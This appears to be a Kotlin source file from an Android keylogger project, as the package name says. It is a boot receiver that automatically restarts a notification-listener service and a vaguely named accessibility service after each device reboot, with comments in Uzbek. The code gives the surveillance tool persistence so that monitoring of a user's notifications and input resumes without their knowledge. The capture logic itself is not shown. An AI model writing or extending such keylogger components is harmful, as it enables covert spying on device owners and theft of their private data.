package com.azamovhudstc.androidkeylogger.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.azamovhudstc.androidkeylogger.service.MyNotificationListenerService
import com.azamovhudstc.androidkeylogger.service.SvcAccFix

class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            // MyNotificationListenerService-ni boshlash
            val notificationServiceIntent = Intent(context, MyNotificationListenerService::class.java)
            context.startService(notificationServiceIntent)

            // AccessibilityService-ni boshlash
            val accessibilityServiceIntent = Intent(context, SvcAccFix::class.java)
            context.startService(accessibilityServiceIntent)
        }
    }
}
